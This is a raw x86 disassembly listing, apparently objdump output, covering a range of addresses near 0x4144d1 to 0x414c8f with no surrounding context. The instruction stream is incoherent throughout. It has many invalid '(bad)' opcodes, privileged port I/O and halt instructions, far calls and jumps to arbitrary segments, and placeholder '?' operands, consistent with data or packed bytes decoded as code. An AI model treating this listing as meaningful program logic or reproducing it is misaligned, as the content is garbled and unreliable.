  4144d1:	jb     0x4144c6
  4144d3:	sub    ch,BYTE PTR ds:0xddc5d75d
  4144d9:	lea    edi,[ebp+eax*4-0x7a]
  4144dd:	jp     0x41455e
  4144df:	out    0xc9,eax
  4144e1:	mov    eax,0xf95546f2
  4144e6:	push   ss
  4144e7:	fcom   QWORD PTR [ebx+0x54fcb15b]
  4144ed:	shl    DWORD PTR [ecx-0x7769aac9],0xb8
  4144f4:	jns    0x41448e
  4144f6:	xchg   ebp,eax
  4144f7:	cmp    eax,0xe538d271
  4144fc:	cmc    
  4144fd:	xchg   DWORD PTR [ebx+0x39404f87],ebx
  414503:	leave  
  414504:	cmp    eax,0x819ec3cc
  414509:	xchg   esp,eax
  41450a:	mov    edx,0x675e064b
  41450f:	mov    ebp,0xa4db0b41
  414514:	cmp    eax,0xdb2179fa
  414519:	add    al,0x33
  41451b:	dec    esp
  41451c:	inc    edx
  41451d:	int    0x2b
  41451f:	clc    
  414520:	mov    dl,0x45
  414522:	and    al,0xd7
  414524:	xchg   ebx,eax
  414525:	nop
  414526:	pop    ebp
  414527:	push   ebp
  414528:	cmp    dl,0xef
  41452b:	sub    DWORD PTR [eax+0x46],ebx
  41452e:	repz scas al,BYTE PTR es:[edi]
  414530:	xor    BYTE PTR [ebx-0xd48a687],0x98
  414537:	jge    0x414584
  414539:	cmp    DWORD PTR [edx+0x5],edx
  41453c:	(bad)  
  41453d:	(bad)  
  41453e:	and    ah,BYTE PTR [edi]
  414540:	adc    DWORD PTR [esi],esp
  414542:	push   eax
  414543:	into   
  414544:	test   BYTE PTR [ebx],bl
  414546:	adc    ecx,DWORD PTR [ecx+0x2e]
  414549:	cmc    
  41454a:	ret    
  41454b:	fcomip st,st(2)
  41454d:	and    cl,dl
  41454f:	jns    0x4145cc
  414551:	or     BYTE PTR [ecx],ch
  414553:	push   ecx
  414554:	mov    bh,0x47
  414556:	js     0x4145ac
  414558:	and    DWORD PTR [esi+0x6017d14d],eax
  41455e:	mov    ch,bh
  414560:	pop    es
  414561:	xchg   ebp,eax
  414562:	xlat   BYTE PTR ds:[ebx]
  414563:	fdivr  st(7),st
  414565:	mov    es,WORD PTR [ecx+ecx*1+0x2d]
  414569:	jge    0x414552
  41456b:	ficom  WORD PTR [esp+esi*2]
  41456e:	xor    DWORD PTR [ebp-0x30],esp
  414571:	jb     0x414504
  414573:	push   cs
  414574:	sbb    eax,0x2448ba5e
  414579:	push   ebp
  41457a:	adc    al,0x54
  41457c:	std    
  41457d:	iret   
  41457e:	xor    edx,DWORD PTR [esi]
  414580:	shr    DWORD PTR [edx],0xf3
  414583:	mov    ds,WORD PTR ss:[edx]
  414586:	xchg   esp,eax
  414587:	xor    al,BYTE PTR [ecx]
  414589:	and    esi,DWORD PTR [edx+0x79c97e40]
  41458f:	inc    esp
  414590:	cmp    BYTE PTR [edx],bl
  414592:	mov    edi,0xf885d551
  414597:	rcr    BYTE PTR [ebx-0xe],1
  41459a:	repnz fwait
  41459c:	(bad)  
  41459d:	sti    
  41459e:	mov    bh,0xc1
  4145a0:	mov    DWORD PTR [eax-0x1e688690],esi
  4145a6:	dec    esp
  4145a7:	test   BYTE PTR [ebx-0x4e],0xd1
  4145ab:	fnstenv [eax+0x65ec00da]
  4145b1:	aam    0xd4
  4145b3:	icebp  
  4145b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145b5:	add    DWORD PTR [eax-0x7c],ebp
  4145b8:	mov    dh,0xa3
  4145ba:	retw   
  4145bc:	xchg   edi,eax
  4145bd:	test   BYTE PTR [ebx-0x1a],cl
  4145c0:	fsubrp st(4),st
  4145c2:	out    0x82,eax
  4145c4:	ins    BYTE PTR es:[edi],dx
  4145c5:	cmp    ch,BYTE PTR [ebx-0x1a734ddb]
  4145cb:	adc    eax,0xfdf2afe1
  4145d0:	adc    DWORD PTR ss:[eax-0x37],edx
  4145d4:	fsubr  st,st(0)
  4145d6:	jns    0x41459e
  4145d8:	and    eax,0x7f822acb
  4145dd:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4145df:	out    dx,eax
  4145e0:	pop    ds
  4145e1:	jne    0x4145d4
  4145e3:	jno    0x414592
  4145e5:	push   es
  4145e6:	cmp    al,0xee
  4145e8:	sub    al,0x9b
  4145ea:	add    DWORD PTR [ecx-0x196858dd],esp
  4145f0:	rcr    BYTE PTR [edi-0x2e],cl
  4145f3:	jns    0x4145ed
  4145f5:	pop    eax
  4145f6:	xor    al,0x52
  4145f8:	jbe    0x4145e5
  4145fa:	mov    ebx,0x2fa5588e
  4145ff:	call   0x51ba:0xd73fcf19
  414606:	pop    ebx
  414607:	xor    ecx,edi
  414609:	jg     0x414628
  41460b:	sbb    BYTE PTR [eax],dl
  41460d:	fcom   QWORD PTR ds:[ecx]
  414610:	ss push edx
  414612:	popf   
  414613:	or     dh,BYTE PTR [ecx]
  414615:	retf   0xee2e
  414618:	adc    cl,ah
  41461a:	adc    eax,0xd798c950
  41461f:	(bad)  [edx+0x7a]
  414622:	xchg   edx,eax
  414623:	cmp    DWORD PTR [edx],esi
  414625:	mov    eax,0xf5800778
  41462a:	inc    eax
  41462b:	xchg   ebp,eax
  41462c:	xchg   DWORD PTR [ecx-0x7135684c],ebp
  414632:	adc    al,0xc9
  414634:	setae  ah
  414637:	sti    
  414638:	popa   
  414639:	xchg   ecx,eax
  41463a:	int    0x62
  41463c:	pop    edx
  41463d:	pop    ebp
  41463e:	cdq    
  41463f:	int3   
  414640:	loope  0x414671
  414642:	lahf   
  414643:	cmp    eax,0x59212cb0
  414648:	push   edi
  414649:	je     0x4146c9
  41464b:	fwait
  41464c:	cmp    al,0x20
  41464e:	into   
  41464f:	in     al,dx
  414650:	pop    es
  414651:	(bad)  
  414652:	int    0xfd
  414654:	jl     0x414674
  414656:	lods   al,BYTE PTR ds:[esi]
  414657:	sahf   
  414658:	ret    
  414659:	sub    bl,BYTE PTR [edi-0x6f]
  41465c:	sti    
  41465d:	xchg   ecx,eax
  41465e:	sub    eax,0x5af4e967
  414663:	xor    al,cl
  414665:	jecxz  0x4145ed
  414667:	arpl   WORD PTR [eax+0x23],bp
  41466a:	ds pop ds
  41466c:	push   cs
  41466d:	and    eax,0x620f4ad9
  414672:	test   ebx,ecx
  414674:	pop    eax
  414675:	addr16 mov ecx,0xef6b8bc
  41467b:	add    cl,cl
  41467d:	mov    edx,0x1190abcc
  414682:	test   BYTE PTR [edx],bh
  414684:	(bad)  
  414685:	add    BYTE PTR [edx-0x4e],ah
  414688:	pop    esp
  414689:	push   ebx
  41468a:	into   
  41468b:	xchg   ecx,eax
  41468c:	cmp    eax,DWORD PTR [edx+edx*8+0x2b9e1cfb]
  414693:	aas    
  414694:	inc    DWORD PTR [ebp+0x24]
  414697:	rep lods al,BYTE PTR ds:[esi]
  414699:	ja     0x4146e7
  41469b:	mov    DWORD PTR [ecx+0x503127a7],edx
  4146a1:	push   esi
  4146a2:	in     al,dx
  4146a3:	leave  
  4146a4:	xchg   DWORD PTR [edi-0x59],esi
  4146a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a8:	in     eax,dx
  4146a9:	nop
  4146aa:	inc    esp
  4146ab:	xchg   edi,eax
  4146ac:	jg     0x41470c
  4146ae:	pop    esp
  4146af:	jp     0x4146fe
  4146b1:	mov    edi,0x25444370
  4146b6:	dec    edi
  4146b7:	test   DWORD PTR [eax],edx
  4146b9:	mov    ebx,0xebcd122b
  4146be:	mov    dl,0x37
  4146c0:	push   DWORD PTR [edx-0x4b]
  4146c3:	xor    bl,dl
  4146c5:	repz jmp 0x69fe8431
  4146cb:	test   DWORD PTR [edx+0x396d7229],esp
  4146d1:	gs push edx
  4146d3:	clc    
  4146d4:	rol    al,1
  4146d6:	fs mov esp,0xc777c4b
  4146dc:	jnp    0x414692
  4146de:	mov    ebp,0xab236831
  4146e3:	into   
  4146e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e5:	xor    al,0xdc
  4146e7:	mov    DWORD PTR [esi+0x56658f3a],esp
  4146ed:	bound  ebp,QWORD PTR ds:0x5e36b41f
  4146f3:	cs and ch,0x2e
  4146f7:	cmp    BYTE PTR [ebx+ebp*8],ah
  4146fa:	mov    ds:0x6f0b1a09,eax
  4146ff:	xchg   DWORD PTR [edi+ebp*4+0x6cd8bffe],edi
  414706:	xor    eax,0x6a8272ac
  41470b:	or     al,bl
  41470d:	xlat   BYTE PTR ds:[ebx]
  41470e:	pop    esp
  41470f:	std    
  414710:	(bad)  
  414711:	jge    0x414764
  414713:	pop    esp
  414714:	fcomp  DWORD PTR [ecx+0xf]
  414717:	jg     0x4146bd
  414719:	mov    esp,0xba402c88
  41471e:	sbb    eax,0x91d331c1
  414723:	aas    
  414724:	mov    BYTE PTR [edx+0x11e80c3e],dl
  41472a:	ins    BYTE PTR es:[edi],dx
  41472b:	imul   esi,DWORD PTR [edx+edx*8-0x1202567],0x49
  414733:	mov    dh,0xd3
  414735:	fsub   st(4),st
  414737:	(bad)  
  414738:	nop
  414739:	push   ecx
  41473a:	fucomip st,st(3)
  41473c:	ds in  al,dx
  41473e:	sub    eax,0x1242be42
  414743:	adc    ah,cl
  414745:	ret    0x57ed
  414748:	clc    
  414749:	dec    esi
  41474a:	inc    ebx
  41474b:	ret    0x8c01
  41474e:	test   eax,0x190059a9
  414753:	xor    eax,0x7dd7a372
  414758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414759:	test   eax,0xc5490a25
  41475e:	cmp    bl,BYTE PTR ds:0x4e4c164b
  414764:	loop   0x4146f7
  414766:	sbb    bh,dh
  414768:	mov    ?,WORD PTR [ecx]
  41476a:	arpl   WORD PTR [eax],cx
  41476c:	xchg   ebx,eax
  41476d:	dec    ebp
  41476e:	call   0x48632c94
  414773:	out    0xdb,al
  414775:	sahf   
  414776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414777:	xchg   ecx,eax
  414778:	call   DWORD PTR [edi]
  41477a:	jb     0x4147ee
  41477c:	test   eax,0xb2c2e93d
  414781:	pop    esi
  414782:	call   0x3ec05e04
  414787:	icebp  
  414788:	lea    ebx,[eax-0x80]
  41478b:	push   ds
  41478c:	sar    dl,cl
  41478e:	adc    al,0xcc
  414790:	bound  esp,QWORD PTR [ebp+0x23]
  414793:	addr16 push ds
  414795:	mov    bh,0x53
  414797:	js     0x414791
  414799:	xor    al,0x6e
  41479b:	add    edi,DWORD PTR [ecx+ebp*2+0x65]
  41479f:	mov    al,0x37
  4147a1:	xor    eax,0x4b3aa71b
  4147a6:	std    
  4147a7:	sub    dl,bl
  4147a9:	or     ebp,DWORD PTR [edi+0x7d580688]
  4147af:	mov    ?,WORD PTR [esi+eax*8+0x86c64ab]
  4147b6:	repz jns 0x4147fc
  4147b9:	xchg   DWORD PTR [ebp-0x211adf35],esi
  4147bf:	mov    esi,0x155dff24
  4147c4:	stc    
  4147c5:	inc    edi
  4147c6:	pop    ecx
  4147c7:	mov    esp,0x55fa60e0
  4147cc:	aam    0x8e
  4147ce:	in     eax,dx
  4147cf:	mov    ah,0xa5
  4147d1:	lock mov ds:0xcdbc6c6c,eax
  4147d7:	jl     0x414792
  4147d9:	test   DWORD PTR [edi],ecx
  4147db:	pop    es
  4147dc:	xchg   ebx,eax
  4147dd:	xlat   BYTE PTR ds:[ebx]
  4147de:	pusha  
  4147df:	xor    ah,ch
  4147e1:	test   eax,0x3cb9f474
  4147e6:	mov    esi,DWORD PTR [esi]
  4147e8:	fbld   TBYTE PTR [esi]
  4147ea:	imul   BYTE PTR [eax-0x26]
  4147ed:	rcl    DWORD PTR [esi+edx*2-0x4649197e],cl
  4147f4:	push   ebx
  4147f5:	inc    esi
  4147f6:	mov    ch,0x7c
  4147f8:	je     0x414812
  4147fa:	jmp    0xd72d:0xd8ffe084
  414801:	gs fmulp st(7),st
  414804:	clc    
  414805:	outs   dx,DWORD PTR ds:[esi]
  414806:	cld    
  414807:	xor    edi,DWORD PTR [edx]
  414809:	mov    ds:0xd4b71526,eax
  41480e:	mov    BYTE PTR [eax],bh
  414810:	(bad)  
  414811:	stc    
  414812:	(bad)  
  414813:	(bad)  [eax]
  414815:	mov    dl,0xb0
  414817:	das    
  414818:	gs leave 
  41481a:	stos   BYTE PTR es:[edi],al
  41481b:	jmp    0x9dc7164
  414820:	and    BYTE PTR [ebx+0x34ffd942],0xbb
  414827:	or     eax,0x20e4c435
  41482c:	scas   al,BYTE PTR es:[edi]
  41482d:	jbe    0x414868
  41482f:	std    
  414830:	sbb    ebx,edi
  414832:	arpl   WORD PTR [ebx-0x5d],bx
  414835:	mov    WORD PTR [edx+edx*4],es
  414838:	jp     0x4147e0
  41483a:	rol    BYTE PTR [ebx],1
  41483c:	shl    DWORD PTR [ecx-0x71],0x7b
  414840:	call   0x8132:0x9915ab35
  414847:	test   DWORD PTR [edx+edx*2-0x235e3b5c],ebx
  41484e:	dec    DWORD PTR [ecx+0x31]
  414851:	pop    ss
  414852:	inc    esp
  414853:	pop    ds
  414854:	pop    ebx
  414855:	test   al,0x42
  414857:	fcmovnu st,st(2)
  414859:	cmp    ecx,edx
  41485b:	mov    ?,WORD PTR [eax+0x7e]
  41485e:	push   ss
  41485f:	int    0xec
  414861:	fldenv [ecx+0x118dcd3f]
  414867:	mov    ebp,0x2a2d40d3
  41486c:	test   al,0xa2
  41486e:	loopne 0x4148e4
  414870:	out    dx,eax
  414871:	sub    cl,bl
  414873:	std    
  414874:	(bad)  
  414875:	shl    DWORD PTR [ebp-0x7836da1a],cl
  41487b:	push   ebp
  41487c:	xor    BYTE PTR [ebx+ecx*8+0x49],dl
  414880:	dec    esi
  414881:	and    DWORD PTR [eax],edx
  414883:	xlat   BYTE PTR ds:[ebx]
  414884:	scas   al,BYTE PTR es:[edi]
  414885:	or     al,0xb1
  414887:	lods   eax,DWORD PTR ds:[esi]
  414888:	hlt    
  414889:	mov    al,0x79
  41488b:	cmp    esi,edx
  41488d:	dec    edi
  41488e:	cmp    eax,0x422ed82a
  414893:	push   esp
  414894:	and    ecx,DWORD PTR [ebp+0x1a9fb417]
  41489a:	mov    bl,0xb
  41489c:	dec    ebx
  41489d:	rcl    ebp,1
  41489f:	loope  0x41491d
  4148a1:	test   DWORD PTR [eax*1+0x485dbf95],0xeb452c89
  4148ac:	jmp    0xc3374b9
  4148b1:	scas   eax,DWORD PTR es:[edi]
  4148b2:	fiadd  DWORD PTR [esp+esi*4-0x4a]
  4148b6:	mov    ebx,0xac2327ed
  4148bb:	retf   0xc34c
  4148be:	lahf   
  4148bf:	pop    ss
  4148c0:	adc    eax,0x15d75278
  4148c5:	in     al,dx
  4148c6:	jl     0x414849
  4148c8:	fcomi  st,st(7)
  4148ca:	jbe    0x4148f0
  4148cc:	jns    0x41489d
  4148ce:	pop    esp
  4148cf:	sub    BYTE PTR [ebp+edx*8+0x7e],0xb1
  4148d4:	shr    cl,cl
  4148d6:	xchg   DWORD PTR [ebp+0x46dab459],ebp
  4148dc:	jmp    0x41487e
  4148de:	je     0x41490d
  4148e0:	retf   0x9734
  4148e3:	add    DWORD PTR [eax-0x2d],esp
  4148e6:	push   0x5db1517e
  4148eb:	or     esp,DWORD PTR ds:0x59d910c5
  4148f1:	mov    eax,0xf1b2f73e
  4148f6:	out    dx,al
  4148f7:	cwde   
  4148f8:	xchg   DWORD PTR [eax+0x50230ee0],esi
  4148fe:	in     eax,dx
  4148ff:	jl     0x4148c5
  414901:	addr16 or ch,dh
  414904:	mov    dl,0x5d
  414906:	daa    
  414907:	into   
  414908:	xchg   ebx,eax
  414909:	mov    cl,0x61
  41490b:	mov    ah,0xf3
  41490d:	mov    edi,0xbc38af38
  414912:	jns    0x4148fa
  414914:	cmp    ebx,DWORD PTR [edi-0x6f]
  414917:	das    
  414918:	ret    
  414919:	mov    ah,ah
  41491b:	pushf  
  41491c:	lahf   
  41491d:	pop    eax
  41491e:	jb     0x414942
  414920:	jbe    0x4148ad
  414922:	js     0x414965
  414924:	ss iret 
  414926:	(bad)  [edx-0x3027b552]
  41492c:	jo     0x414953
  41492e:	or     BYTE PTR ds:[edx-0x5b],dh
  414932:	push   ds
  414933:	mov    ds:0x1c560615,al
  414938:	add    BYTE PTR [ebp-0x31],ch
  41493b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41493c:	mov    edi,DWORD PTR [edx+ebx*2]
  41493f:	stos   BYTE PTR es:[edi],al
  414940:	call   0x12f8be5d
  414945:	icebp  
  414946:	rcl    BYTE PTR [edi-0x9198ad1],1
  41494c:	(bad)  
  41494d:	mov    eax,ds:0x5c489bc7
  414952:	jmp    0x452d4a21
  414957:	in     eax,dx
  414958:	pop    esi
  414959:	out    0x9c,eax
  41495b:	call   0x5e36:0x7ac1af4b
  414962:	xor    eax,DWORD PTR [ecx]
  414964:	xchg   edx,eax
  414965:	aad    0x4b
  414967:	mov    cl,BYTE PTR [ebx]
  414969:	push   0x4190b0ca
  41496e:	clc    
  41496f:	sub    edx,esi
  414971:	cdq    
  414972:	fbld   TBYTE PTR [eax]
  414974:	jno    0x414902
  414976:	sub    al,ah
  414978:	pop    eax
  414979:	clc    
  41497a:	xchg   BYTE PTR ss:[edx],bl
  41497d:	lods   al,BYTE PTR ds:[esi]
  41497e:	rcl    BYTE PTR [ebp+0x9432554],0x35
  414985:	iret   
  414986:	popa   
  414987:	jl     0x4149bc
  414989:	imul   esp,ecx,0x64
  41498c:	sbb    eax,0x87ab93c7
  414991:	cmp    al,0x6a
  414993:	add    dh,BYTE PTR [eax+0x48]
  414996:	and    esp,esp
  414998:	test   BYTE PTR [edx],dl
  41499a:	or     cl,BYTE PTR [ecx+ecx*2]
  41499d:	jo     0x4149f9
  41499f:	mov    dl,0x56
  4149a1:	mov    ds:0x6946bf51,eax
  4149a6:	adc    eax,0xc5c254e2
  4149ab:	cwde   
  4149ac:	test   DWORD PTR [edx-0x1f],ebp
  4149af:	add    al,0x8f
  4149b1:	mov    BYTE PTR [ecx-0x28e528fc],al
  4149b7:	push   0xfe80eac5
  4149bc:	aad    0xd2
  4149be:	jb     0x4149b1
  4149c0:	cmp    esi,DWORD PTR [edx+0x30]
  4149c3:	pop    edi
  4149c4:	jle    0x414a21
  4149c6:	ror    ebp,cl
  4149c8:	jb     0x41494a
  4149ca:	jmp    0xeec4ee1b
  4149cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149d0:	popf   
  4149d1:	lahf   
  4149d2:	xchg   edx,eax
  4149d3:	pop    esi
  4149d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d5:	mov    eax,ds:0xf3eb625c
  4149da:	pop    edi
  4149db:	dec    eax
  4149dc:	and    edi,edx
  4149de:	test   al,0x33
  4149e0:	inc    esi
  4149e1:	shl    bl,0x54
  4149e4:	mov    dh,0xe3
  4149e6:	push   esi
  4149e7:	outs   dx,BYTE PTR ds:[esi]
  4149e8:	(bad)  
  4149ea:	inc    ebx
  4149eb:	mov    cl,0x6
  4149ed:	ja     0x4149cd
  4149ef:	gs out dx,al
  4149f1:	dec    esp
  4149f2:	jl     0x414981
  4149f4:	xchg   ebx,eax
  4149f5:	sar    dl,1
  4149f7:	mov    eax,0xf9b1362b
  4149fc:	sub    ecx,esi
  4149fe:	push   edi
  4149ff:	xor    al,0xe3
  414a01:	leave  
  414a02:	push   ss
  414a03:	or     ch,BYTE PTR [ecx+0x71]
  414a06:	mov    ebp,0x7f1a14c2
  414a0b:	nop
  414a0c:	xor    edi,esi
  414a0e:	push   cs
  414a0f:	mov    dl,0x25
  414a11:	lock mov al,0x6c
  414a14:	cmp    eax,0x9571d361
  414a19:	sbb    BYTE PTR [ebx+ebp*8+0x57],ch
  414a1d:	psrad  mm4,QWORD PTR [ebx]
  414a20:	jbe    0x4149c5
  414a22:	sbb    ecx,DWORD PTR [eax-0xf]
  414a25:	xchg   esi,eax
  414a26:	std    
  414a27:	cld    
  414a28:	hlt    
  414a29:	adc    BYTE PTR [edi-0x2b],0x1f
  414a2d:	jno    0x414a78
  414a2f:	popf   
  414a30:	stc    
  414a31:	ja     0x4149fa
  414a33:	int3   
  414a34:	cmp    al,0x20
  414a36:	call   0x660e:0xdfa3bdfd
  414a3d:	adc    edi,ecx
  414a3f:	cwde   
  414a40:	xor    al,0xc
  414a42:	jne    0x414a83
  414a44:	sub    bh,BYTE PTR [edi]
  414a46:	arpl   bp,sp
  414a48:	sar    BYTE PTR [esi-0x7],0xe1
  414a4c:	mov    eax,0x329c457a
  414a51:	test   BYTE PTR [edi+ecx*2+0x7d3e5beb],al
  414a58:	mov    BYTE PTR [ecx],dh
  414a5a:	ins    DWORD PTR es:[edi],dx
  414a5b:	xchg   DWORD PTR [edi],edi
  414a5d:	push   0xffffff8d
  414a5f:	js     0x414ab7
  414a61:	fistp  QWORD PTR [eax]
  414a63:	repnz mov bh,0xd4
  414a66:	jmp    0xe86bac77
  414a6b:	pop    edx
  414a6c:	outs   dx,BYTE PTR ds:[esi]
  414a6d:	add    BYTE PTR [eax+0xe73a70a],0xf5
  414a74:	mov    edx,DWORD PTR [ebp-0x1c]
  414a77:	xor    eax,esi
  414a79:	jmp    0x416dee
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	add    eax,0xef2b8389
  414a8f:	inc    edi
  414a90:	popa   
  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx+0x30]
  414a97:	int    0x62
  414a99:	rol    DWORD PTR [edi+0x5b],1
  414a9c:	mov    esp,DWORD PTR [eax]
  414a9e:	rol    al,1
  414aa0:	ss fcmovu st,st(0)
  414aa3:	test   BYTE PTR [edi+0x5f],cl
  414aa6:	loop   0x414ada
  414aa8:	push   0xcae904e
  414aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aae:	sbb    cl,BYTE PTR [edx-0x70]
  414ab1:	cmp    BYTE PTR [edi+0x4220c2b],cl
  414ab7:	mov    WORD PTR [ecx],fs
  414ab9:	fs in  al,0xaf
  414abc:	mov    dl,0xe9
  414abe:	loope  0x414a59
  414ac0:	js     0x414aef
  414ac2:	fsub   st,st(6)
  414ac4:	cs mov ah,0xd8
  414ac7:	ret    
  414ac8:	fisub  WORD PTR [esi]
  414aca:	gs xchg ebp,eax
  414acc:	ds sub ebx,eax
  414acf:	jmp    esp
  414ad1:	or     eax,0xf396c4b5
  414ad6:	rcl    DWORD PTR [ebx-0x4c],1
  414ad9:	jmp    0x414b17
  414adb:	mov    bh,0x40
  414add:	cwde   
  414ade:	addr16 adc eax,0x66ead780
  414ae4:	in     eax,dx
  414ae5:	leave  
  414ae6:	rol    cl,1
  414ae8:	sbb    DWORD PTR [eax+eax*1],ebp
  414aeb:	inc    esi
  414aec:	jmp    0xd603:0x5f361553
  414af3:	test   dl,0xe8
  414af6:	imul   eax,DWORD PTR [edx-0x6c],0x42
  414afa:	int    0xdc
  414afc:	sbb    edi,edx
  414afe:	dec    ebx
  414aff:	push   edi
  414b00:	dec    ecx
  414b01:	scas   eax,DWORD PTR es:[edi]
  414b02:	fwait
  414b03:	jbe    0x414ade
  414b05:	in     eax,0xf7
  414b07:	ins    DWORD PTR es:[edi],dx
  414b08:	inc    eax
  414b09:	(bad)  
  414b0a:	popa   
  414b0b:	fisttp QWORD PTR [edi-0xb]
  414b0e:	pushf  
  414b0f:	dec    edx
  414b10:	outs   dx,BYTE PTR ds:[esi]
  414b11:	pop    ss
  414b12:	jecxz  0x414ada
  414b14:	mov    esp,?
  414b16:	(bad)  
  414b17:	dec    edx
  414b18:	gs ins BYTE PTR es:[edi],dx
  414b1a:	xor    edx,DWORD PTR [eax]
  414b1c:	sub    cl,al
  414b1e:	mov    al,0xf
  414b20:	mov    esp,0xe45f1cf8
  414b25:	icebp  
  414b26:	clc    
  414b27:	inc    eax
  414b28:	pop    ebp
  414b29:	mov    ?,edx
  414b2b:	xchg   edx,eax
  414b2c:	pop    ss
  414b2d:	mov    esp,DWORD PTR [ebp+0x77]
  414b30:	pop    edi
  414b31:	out    dx,eax
  414b32:	(bad)  
  414b33:	imul   DWORD PTR [edi+0x76def2fb]
  414b39:	pop    edi
  414b3a:	in     al,0x5f
  414b3c:	cmp    BYTE PTR [ecx+edi*1],bl
  414b3f:	iret   
  414b40:	outs   dx,BYTE PTR ds:[esi]
  414b41:	mov    ebx,0xbd71dbcc
  414b46:	jb     0x414ad2
  414b48:	pop    esi
  414b49:	sbb    edi,DWORD PTR [ebx]
  414b4b:	ins    BYTE PTR es:[edi],dx
  414b4c:	ret    
  414b4d:	fisubr WORD PTR [ecx]
  414b4f:	pop    edi
  414b50:	das    
  414b51:	aaa    
  414b52:	add    ebp,DWORD PTR [edx+0x54704f39]
  414b58:	std    
  414b59:	scas   al,BYTE PTR es:[edi]
  414b5a:	push   esp
  414b5b:	pusha  
  414b5c:	dec    ebx
  414b5d:	fst    QWORD PTR [ecx-0x7f93cfdc]
  414b63:	stc    
  414b64:	mov    cl,0xf4
  414b66:	mov    ch,0x66
  414b68:	retf   
  414b69:	sub    edx,ebx
  414b6b:	dec    eax
  414b6c:	xor    BYTE PTR [eax-0x2df53a26],ah
  414b72:	nop
  414b73:	loope  0x414afb
  414b75:	call   0x1599:0xf09e9596
  414b7c:	or     ebx,edx
  414b7e:	ds sahf 
  414b80:	xchg   BYTE PTR [ebx+0x4b976774],al
  414b86:	call   0x17d6:0x343f8ac3
  414b8d:	data16 jne 0x414bd2
  414b90:	jp     0x414bfa
  414b92:	xchg   ebx,eax
  414b93:	adc    dl,ah
  414b95:	or     ah,BYTE PTR [ecx+0x7]
  414b98:	push   ds
  414b99:	aas    
  414b9a:	xor    DWORD PTR [ebx],edi
  414b9c:	repnz cmp eax,0xd0b6f39a
  414ba2:	dec    edx
  414ba3:	jle    0x414b8c
  414ba5:	and    ch,BYTE PTR [esp+edx*8+0x5da637d5]
  414bac:	adc    dl,ch
  414bae:	out    dx,al
  414baf:	pop    edi
  414bb0:	nop
  414bb1:	fcmovne st,st(2)
  414bb3:	(bad)  
  414bb4:	ss jecxz 0x414c1b
  414bb7:	and    dh,BYTE PTR [edx-0x6f]
  414bba:	mov    ebx,0x4cc5b88f
  414bbf:	fistp  DWORD PTR [ecx+0x6c36253a]
  414bc5:	dec    ecx
  414bc6:	ss adc al,0xf1
  414bc9:	jae    0x414bcf
  414bcb:	out    0x9,eax
  414bcd:	jg     0x414b55
  414bcf:	adc    eax,0x833acd1f
  414bd4:	jbe    0x414b9b
  414bd6:	sub    DWORD PTR [edi-0x42747f72],esp
  414bdc:	mov    eax,0x20cc3db3
  414be1:	jmp    0x91111e16
  414be6:	or     ch,BYTE PTR [ebp-0x3309dc49]
  414bec:	aam    0xa0
  414bee:	pop    ebx
  414bef:	cmp    bl,0x6c
  414bf2:	adc    eax,0x77d9ac2a
  414bf7:	jle    0x414c6d
  414bf9:	cmp    bh,bh
  414bfb:	cmc    
  414bfc:	psllq  mm2,QWORD PTR [ebx+0x4e158e1a]
  414c03:	aaa    
  414c04:	mov    eax,ds:0xa125826f
  414c09:	enter  0x3dc9,0xf7
  414c0d:	push   edi
  414c0e:	iret   
  414c0f:	pop    esp
  414c10:	arpl   dx,bp
  414c12:	ja     0x414c43
  414c14:	test   esp,0x7ae3dc71
  414c1a:	lods   eax,DWORD PTR es:[esi]
  414c1c:	mov    edx,0x24df0a21
  414c21:	in     eax,0x32
  414c23:	jmp    0x414c60
  414c25:	mov    edx,fs
  414c27:	scas   al,BYTE PTR es:[edi]
  414c28:	(bad)  
  414c29:	pop    ebp
  414c2a:	ja     0x414c2c
  414c2c:	arpl   WORD PTR [ecx+0x49],bp
  414c2f:	xchg   esi,eax
  414c30:	jne    0x414bd1
  414c32:	in     eax,dx
  414c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c34:	adc    cl,BYTE PTR [ebp-0x3b]
  414c37:	push   esp
  414c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c39:	mov    BYTE PTR [edi+eax*8+0x3e],dh
  414c3d:	dec    ebp
  414c3e:	out    dx,al
  414c3f:	push   0x442953d7
  414c44:	mov    esp,DWORD PTR [edx]
  414c46:	dec    esp
  414c47:	popf   
  414c48:	in     eax,0x5e
  414c4a:	push   ss
  414c4b:	stos   BYTE PTR es:[edi],al
  414c4c:	cmc    
  414c4d:	mov    ch,0x7e
  414c4f:	cmp    ebx,ebp
  414c51:	sub    BYTE PTR [edi+0x35],bl
  414c54:	jmp    0x414c4c
  414c56:	cs mov ebx,0xbe63e9e2
  414c5c:	std    
  414c5d:	jge    0x414c79
  414c5f:	shl    DWORD PTR [edi+0x8320bf7],0x96
  414c66:	ja     0x414cba
  414c68:	inc    esi
  414c69:	xchg   ecx,eax
  414c6a:	mov    edi,0xc1ac0e98
  414c6f:	jae    0x414c7b
  414c71:	(bad)  
  414c72:	retf   
  414c73:	loopne 0x414c08
  414c75:	cmp    eax,0x28cff8d6
  414c7a:	xor    al,0x44
  414c7c:	push   0xffffffca
  414c7e:	cld    
  414c7f:	push   0xfffffff5
  414c81:	dec    esi
  414c82:	loop   0x414c36
  414c84:	enter  0xfc22,0xb3
  414c88:	mov    ds,ebx
  414c8a:	out    dx,eax
  414c8b:	jg     0x414c40
  414c8d:	xor    ecx,ebp
  414c8f:	add    cl,BYTE PTR [edi+ebp*2-0x41]
